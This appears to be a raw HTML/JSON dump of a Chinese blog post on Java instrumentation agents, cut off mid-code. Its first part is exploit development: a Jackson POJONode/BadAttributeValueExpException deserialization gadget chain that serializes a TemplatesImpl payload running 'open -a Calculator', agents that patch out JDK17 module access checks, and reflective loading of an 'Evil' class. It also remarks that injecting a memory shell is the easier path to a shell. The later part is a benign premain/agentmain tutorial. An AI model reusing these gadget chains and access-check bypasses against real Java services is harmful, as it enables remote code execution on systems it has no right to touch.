title=\"Jackson删除writeReplace方法\"></a>Jackson删除writeReplace方法</h2><p>说到这个链子，我们都知道需要删除BaseJsonNode的writeReplace方法。但是我们其实可以在premain的时候就把这件事情给做了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">template</span> <span class=\"operator\">=</span> Gadgets.createTemplatesImpl(<span class=\"string\">&quot;open -a Calculator&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> ClassPool.getDefault().get(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">CtMethod</span> <span class=\"variable\">writeReplace</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">ctClass.removeMethod(writeReplace);</span><br><span class=\"line\">ctClass.toClass();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">POJONode</span> <span class=\"variable\">jsonNodes</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">POJONode</span>(template);</span><br><span class=\"line\"><span class=\"type\">BadAttributeValueExpException</span> <span class=\"variable\">badAttributeValueExpException</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BadAttributeValueExpException</span>(<span class=\"literal\">null</span>);</span><br><span class=\"line\">Reflections.setFieldValue(badAttributeValueExpException, <span class=\"string\">&quot;val&quot;</span>, jsonNodes);</span><br><span class=\"line\"></span><br><span class=\"line\">System.out.println(Tool.base64Encode(Tool.serialize(badAttributeValueExpException)));</span><br></pre></td></tr></table></figure>\n\n<p>transform</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JacksonClassFileTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ClassFileTransformer</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"type\">byte</span>[] classfileBuffer)&#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">target1</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">className2</span> <span class=\"operator\">=</span> className.replace(<span class=\"string\">&quot;/&quot;</span>, <span class=\"string\">&quot;.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className2.equals(target1)) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Find the Inject Class: &quot;</span>+target1);</span><br><span class=\"line\">            <span class=\"type\">ClassPool</span> <span class=\"variable\">pool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">CtClass</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> pool.getCtClass(className2);</span><br><span class=\"line\">                <span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> c.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">                c.removeMethod(ctMethod);</span><br><span class=\"line\">                <span class=\"type\">byte</span>[] bytes = c.toBytecode();</span><br><span class=\"line\">                c.detach();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>agent</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JacksonAgent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">premain</span><span class=\"params\">(String agentArgs, Instrumentation inst)</span> <span class=\"keyword\">throws</span> UnmodifiableClassException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        inst.addTransformer(<span class=\"keyword\">new</span> <span class=\"title class_\">JacksonClassFileTransformer</span>(),<span class=\"literal\">true</span>);</span><br><span class=\"line\">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>.equals(loadedClass.getName()))&#123;</span><br><span class=\"line\">                <span class=\"comment\">//重新transform</span></span><br><span class=\"line\">                inst.retransformClasses(loadedClass);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>.mf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br><span class=\"line\">Premain-Class: cn.org.unk.JacksonAgent</span><br></pre></td></tr></table></figure>\n\n<p>然后我们生成对应的jar包。</p>\n<p>然后我们需要让项目运行的时候加上这样一个参数.带上我们的premain agent。</p>\n<p><code>-javaagent:/Users/taoyu/Music/code/java_code/Java-useful-agent/Java17/target/Java17-premain.jar</code></p>\n<p>Run-&gt;edit configurations</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183210072.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183210072.png\"  alt=\"image-20241120183210072\" lazyload></a></p>\n<p>然后我们构造链子的好时候就可以将以下代码删除依旧不影响我们poc的构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CtClass ctClass = ClassPool.getDefault().get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span><br><span class=\"line\">CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);</span><br><span class=\"line\">ctClass.removeMethod(writeReplace);</span><br><span class=\"line\">ctClass.toClass();</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"高版本jdk反射修改私有属性\"><a href=\"#高版本jdk反射修改私有属性\" class=\"headerlink\" title=\"高版本jdk反射修改私有属性\"></a>高版本jdk反射修改私有属性</h2><p>dk9出现了module机制：<a href=\"https://zhuanlan.zhihu.com/p/640217638\">https://zhuanlan.zhihu.com/p/640217638</a></p>\n<p>java.xml是module的名字，不一定要和包名一样。</p>\n<p>exports表示外部可以访问当前module的哪些package。</p>\n<p>exports…to 表示指定该package只能被哪些package访问。</p>\n<p>同一个module下的类可以互相访问。</p>\n<p>我们以这个链子为例。</p>\n<p>EventListenerList ReadObject -&gt; ToString</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Person</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">EventListenerList</span> <span class=\"variable\">list</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">EventListenerList</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">UndoManager</span> <span class=\"variable\">manager</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UndoManager</span>();</span><br><span class=\"line\"><span class=\"type\">Vector</span> <span class=\"variable\">vector</span> <span class=\"operator\">=</span> (Vector) getFieldValue(manager, <span class=\"string\">&quot;edits&quot;</span>);</span><br><span class=\"line\">vector.add(p);</span><br><span class=\"line\">setFieldValue(list, <span class=\"string\">&quot;listenerList&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">byte</span>[] code = serialize(list);</span><br><span class=\"line\">unserialize(code);</span><br></pre></td></tr></table></figure>\n\n<p>Person</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;this is tostring&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们正常情况下调用私有属性的时候。下面这个 flag值为true。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setAccessible</span><span class=\"params\">(<span class=\"type\">boolean</span> flag)</span> &#123;</span><br><span class=\"line\">    AccessibleObject.checkPermission();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (flag) checkCanSetAccessible(Reflection.getCallerClass());</span><br><span class=\"line\">    setAccessible0(flag);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>会爆以下错误。但是我们如果设置一个premain，就可以修改这段代码。让flag恒为flase。这样我们就可以setAccessible来进行各种操作了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread &quot;main&quot; java.lang.reflect.InaccessibleObjectException: Unable to make field protected java.util.Vector javax.swing.undo.CompoundEdit.edits accessible: module java.desktop does not &quot;opens javax.swing.undo&quot; to unnamed module @60d14f0f</span><br><span class=\"line\">\tat java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)</span><br><span class=\"line\">\tat java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)</span><br><span class=\"line\">\tat java.base/java.lang.reflect.Field.checkCanSetAccessible(Field.java:178)</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyClassFileTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ClassFileTransformer</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"type\">byte</span>[] classfileBuffer)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">target4</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;java.lang.reflect.Field&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">className2</span> <span class=\"operator\">=</span> className.replace(<span class=\"string\">&quot;/&quot;</span>, <span class=\"string\">&quot;.&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className2.equals(target4)) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Find the Inject Class: &quot;</span>+target4);</span><br><span class=\"line\">            <span class=\"type\">ClassPool</span> <span class=\"variable\">pool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"type\">CtClass</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> pool.getCtClass(className2);</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;hhhh&quot;</span>);</span><br><span class=\"line\">                <span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> c.getDeclaredMethod(<span class=\"string\">&quot;setAccessible&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                ctMethod.setBody(<span class=\"string\">&quot;&#123;        java.lang.reflect.AccessibleObject.checkPermission();\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        if (false) checkCanSetAccessible(Reflection.getCallerClass());\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        setAccessible0($1);&#125;&quot;</span>);</span><br><span class=\"line\">                <span class=\"type\">byte</span>[] bytes = c.toBytecode();</span><br><span class=\"line\">                c.detach();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyAgent</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">premain</span><span class=\"params\">(String agentArgs, Instrumentation inst)</span> <span class=\"keyword\">throws</span> UnmodifiableClassException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        inst.addTransformer(<span class=\"keyword\">new</span> <span class=\"title class_\">MyClassFileTransformer</span>(),<span class=\"literal\">true</span>);</span><br><span class=\"line\">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span>.equals(loadedClass.getName()))&#123;</span><br><span class=\"line\">                <span class=\"comment\">//重新transform</span></span><br><span class=\"line\">                inst.retransformClasses(loadedClass);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"高版本JDK反射类加载\"><a href=\"#高版本JDK反射类加载\" class=\"headerlink\" title=\"高版本JDK反射类加载\"></a>高版本JDK反射类加载</h2><p>由于高版本的module机制，</p>\n<p>无法反射调用 TemplatesImpl 的get方法，POJONode的toString -&gt; 到任意get 的这种方法也没有办法用。</p>\n<p>但是我们可以修改Method 的 setAccessible也修改一下我们就可以了。但是需要让服务端加载这个permain时不太现实的。</p>\n<p>但是我们可以通过agentmain进行修改，但是有那种功夫，我们还不如注入内存马。直接拿shell。</p>\n<p>把上面的那个agent 的 Filed改成Method就可以了。<br>这样的这个恶意类在jdk17的环境下依旧是可以被加载的。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;target/classes/Evil.class&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> ClassLoader.class.getDeclaredMethod(<span class=\"string\">&quot;defineClass&quot;</span>, String.class, <span class=\"type\">byte</span>[].class, <span class=\"type\">int</span>.class, <span class=\"type\">int</span>.class);</span><br><span class=\"line\">method.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">((Class)method.invoke(ClassLoader.getSystemClassLoader(), <span class=\"string\">&quot;Evil&quot;</span>, bytes, <span class=\"number\">0</span>, bytes.length)).newInstance();</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n","excerpt":"","more":"<h1 id=\"Agent基本认识\"><a href=\"#Agent基本认识\" class=\"headerlink\" title=\"Agent基本认识\"></a>Agent基本认识</h1><p>Agent（代理）来讲，其大致可以分为两种，一种是在 JVM 启动前加载的<code>premain-Agent</code>，另一种是 JVM 启动之后加载的 <code>agentmain-Agent</code>。这里我们可以将其理解成一种特殊的 Interceptor（拦截器）</p>\n<h2 id=\"premain-Agent\"><a href=\"#premain-Agent\" class=\"headerlink\" title=\"premain-Agent\"></a>premain-Agent</h2><p>首先我们先定义这样一个 agent.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Java_Agent_premain</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">premain</span><span class=\"params\">(String args, Instrumentation inst)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span> ; i&lt;<span class=\"number\">10</span> ; i++)&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;调用了premain-Agent！&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Agent.mf </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Premain-Class: Java_Agent_premain</span><br></pre></td></tr></table></figure>\n\n<p>然后 生成我们的 premain agent</p>\n<p><code>jar cvfm agent.jar META-INF/maven/agent.MF Java_Agent_premain.class</code></p>\n<p>相应的我们准备一个 hello.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Hello</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>hello.mf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Main-Class: Hello</span><br></pre></td></tr></table></figure>\n\n<p>jar cvfm hello.jar META-INF&#x2F;maven&#x2F;hello.mf Hello.class</p>\n<p>然后其实可以发现我们的Java_Agent_premain 是运行Hello之前的。</p>\n<p>这个premain-Agent是在jvm启动前加载的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -javaagent:agent.jar -jar hello.jar</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">Hello World!</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"VirtualMachine\"><a href=\"#VirtualMachine\" class=\"headerlink\" title=\"VirtualMachine\"></a>VirtualMachine</h2><p>先说一下环境，引入 tool.jar</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.sun<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>tools<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.8.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>system<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">systemPath</span>&gt;</span>/Library/Java/JavaVirtualMachines/jdk8u275/lib/tools.jar<span class=\"tag\">&lt;/<span class=\"name\">systemPath</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p><code>com.sun.tools.attach.VirtualMachine</code>类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p>\n<p>比如这个 获取特定虚拟机PID</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">get_PID</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(vmd.displayName().equals(<span class=\"string\">&quot;com.drunkbaby.get_PID&quot;</span>))</span><br><span class=\"line\">                System.out.println(vmd.id()); </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"agentmain-Agent\"><a href=\"#agentmain-Agent\" class=\"headerlink\" title=\"agentmain-Agent\"></a>agentmain-Agent</h2><p>premain-Agent是在 JVM 启动前加载的,这个agentmain是 JVM 启动之后加载的。</p>\n<p>先编写一个 <code>Sleep_Hello</code> 类，模拟正在运行的 JVM</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.drunkbaby;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"keyword\">static</span> java.lang.Thread.sleep;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Sleep_Hello</span> &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span 